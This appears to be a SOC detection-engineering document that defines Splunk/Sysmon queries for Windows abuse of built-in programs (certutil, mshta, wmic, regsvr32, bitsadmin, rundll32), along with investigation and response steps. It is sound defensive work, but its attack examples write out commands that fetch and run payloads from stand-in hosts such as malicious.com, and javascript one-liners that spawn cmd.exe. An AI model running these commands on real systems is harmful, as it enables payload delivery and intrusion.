# Suspicious Process Detection

## Overview

Detects suspicious process execution patterns including LOLBAS (Living Off The Land Binaries and Scripts), unusual parent-child relationships, and known malicious tools.

## Detection Details

| Property | Value |
|----------|-------|
| **Detection ID** | SOC-DET-004 |
| **Severity** | Medium to High |
| **Tactics** | Defense Evasion, Execution |
| **Technique** | [T1218 - System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/) |
| **Data Source** | Sysmon Event Log |
| **Log Source** | `Microsoft-Windows-Sysmon/Operational` |
| **Event Code** | 1 (Process creation) |

## Description

Attackers often abuse legitimate Windows binaries (LOLBAS) to execute malicious code, bypass application whitelisting, and evade detection. This detection identifies:
- Certutil abuse for file download/decode
- MSHTA execution
- WMIC process creation
- Regsvr32 script execution
- Rundll32 JavaScript execution
- Suspicious parent-child relationships

## Detection Logic

### LOLBAS - Certutil

```spl
index=sysmon_events EventCode=1
| search Image="*certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*decode*" OR CommandLine="*-decode*")
| table _time, CommandLine, User, ParentImage
```

**Attack Example:**
```cmd
certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe
certutil.exe -decode payload.b64 payload.exe
```

### LOLBAS - MSHTA

```spl
index=sysmon_events EventCode=1
| search Image="*mshta.exe"
| table _time, CommandLine, User, ParentImage
```

**Attack Example:**
```cmd
mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('cmd.exe'))
mshta.exe http://malicious.com/payload.hta
```

### LOLBAS - WMIC

```spl
index=sysmon_events EventCode=1
| search Image="*wmic.exe" CommandLine="*process*" CommandLine="*call*" CommandLine="*create*"
| table _time, CommandLine, User
```

**Attack Example:**
```cmd
wmic.exe process call create "cmd.exe /c malicious.bat"
```

### LOLBAS - Regsvr32

```spl
index=sysmon_events EventCode=1
| search Image="*regsvr32.exe" (CommandLine="*scrobj*" OR CommandLine="*.dll")
| table _time, CommandLine, User, ParentImage
```

**Attack Example:**
```cmd
regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll
```

### Suspicious Parent-Child Relationships

```spl
index=sysmon_events EventCode=1
| search (ParentImage="*winword.exe" OR ParentImage="*excel.exe" OR ParentImage="*powerpnt.exe")
  (Image="*cmd.exe" OR Image="*powershell.exe" OR Image="*wscript.exe")
| table _time, ParentImage, Image, CommandLine, User
```

### Combined LOLBAS Detection

```spl
index=sysmon_events EventCode=1
| search (Image="*certutil.exe" AND (CommandLine="*urlcache*" OR CommandLine="*decode*"))
  OR (Image="*mshta.exe")
  OR (Image="*bitsadmin.exe" AND CommandLine="*transfer*")
  OR (Image="*regsvr32.exe" AND CommandLine="*scrobj*")
  OR (Image="*rundll32.exe" AND CommandLine="*javascript*")
  OR (Image="*wmic.exe" AND CommandLine="*process*" AND CommandLine="*call*" AND CommandLine="*create*")
| eval technique=case(
    like(Image, "%certutil%"), "Certutil Abuse",
    like(Image, "%mshta%"), "MSHTA Execution",
    like(Image, "%bitsadmin%"), "BITS Transfer",
    like(Image, "%regsvr32%"), "Regsvr32 Proxy",
    like(Image, "%rundll32%"), "Rundll32 Execution",
    like(Image, "%wmic%"), "WMIC Execution",
    1=1, "Other LOLBAS"
  )
| table _time, technique, Image, CommandLine, User, ParentImage
| sort -_time
```

## Expected Results

### Normal Activity

| Process | CommandLine | Result |
|---------|-------------|--------|
| certutil.exe | `certutil -hashfile file.txt MD5` | Legitimate hash check |
| regsvr32.exe | `regsvr32 legitimate.dll` | Normal DLL registration |

### Attack Detected

| Process | CommandLine | Result |
|---------|-------------|--------|
| certutil.exe | `certutil -urlcache -f http://evil.com/mal.exe` | **ALERT** |
| mshta.exe | `mshta javascript:close(...)` | **ALERT** |
| wmic.exe | `wmic process call create cmd.exe` | **ALERT** |

## Alert Configuration

### High Severity Alert

```spl
# Search
index=sysmon_events EventCode=1
| search (Image="*mshta.exe")
  OR (Image="*certutil.exe" AND CommandLine="*urlcache*")
  OR (Image="*regsvr32.exe" AND CommandLine="*scrobj*")

# Trigger: Number of Results > 0
# Severity: High
```

## Investigation Steps

### 1. Analyze Command Line

```spl
# Get full command line details
index=sysmon_events EventCode=1 Image="*certutil*"
| table _time, CommandLine, User, ParentImage, CurrentDirectory
```

### 2. Check for Downloaded Files

```spl
# Did the process create any files?
index=sysmon_events EventCode=11
| search Image="*certutil*" OR Image="*mshta*" OR Image="*bitsadmin*"
| table _time, TargetFilename, Image
```

### 3. Network Connections

```spl
# Did the process make network connections?
index=sysmon_events EventCode=3
| search Image="*certutil*" OR Image="*mshta*" OR Image="*regsvr32*"
| table _time, DestinationIp, DestinationPort, Image
```

### 4. Child Processes

```spl
# Did it spawn any child processes?
index=sysmon_events EventCode=1
| search ParentImage="*certutil*" OR ParentImage="*mshta*" OR ParentImage="*wmic*"
| table _time, Image, CommandLine
```

## Response Actions

### Immediate

1. **Kill process** - Terminate suspicious process
2. **File quarantine** - Isolate any downloaded files
3. **Network block** - Block C2 IP addresses

### Short-term

1. **File analysis** - Hash and analyze downloaded files
2. **Process tree** - Reconstruct full process tree
3. **User context** - Determine if user initiated or malware

### Long-term

1. **AppLocker** - Implement application whitelisting
2. **Attack surface reduction** - Enable ASR rules
3. **User training** - Educate on social engineering

## False Positives

### Common Scenarios

1. **Software installers** using certutil for certificate management
2. **Legitimate scripts** using WMIC for system queries
3. **Admin tools** using regsvr32 for DLL registration

### Tuning

```spl
# Exclude known paths
index=sysmon_events EventCode=1
| search NOT (Image="C:\\Program Files\\*")
| search Image="*certutil*"
```

## Testing

### Generate Test Data

```cmd
# Certutil download (safe URL)
certutil.exe -urlcache -split -f http://example.com/test.txt test.txt

# MSHTA (safe)
mshta.exe javascript:close()

# WMIC
wmic.exe process call create "notepad.exe"
```

### Verify Detection

```spl
# Check detection
index=sysmon_events EventCode=1 earliest=-1h
| search Image="*certutil*" OR Image="*mshta*" OR Image="*wmic*"
| stats count
# Should match test executions
```

## Additional LOLBAS

### Bitsadmin

```spl
index=sysmon_events EventCode=1
| search Image="*bitsadmin.exe" CommandLine="*transfer*"
```

**Attack:**
```cmd
bitsadmin.exe /transfer job http://malicious.com/payload.exe C:\temp\payload.exe
```

### Rundll32

```spl
index=sysmon_events EventCode=1
| search Image="*rundll32.exe" CommandLine="*javascript*"
```

**Attack:**
```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe")
```

## References

- [LOLBAS Project](https://lolbas-project.github.io/)
- [MITRE ATT&CK T1218](https://attack.mitre.org/techniques/T1218/)
- [Oddvar Moe - LOLBAS](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

## Changelog

| Date | Version | Author | Changes |
|------|---------|--------|---------|
| 2024-02-01 | 1.0 | SOC Team | Initial detection |
| 2024-02-25 | 1.1 | SOC Team | Added parent-child detection |
| 2024-03-20 | 1.2 | SOC Team | Added additional LOLBAS |
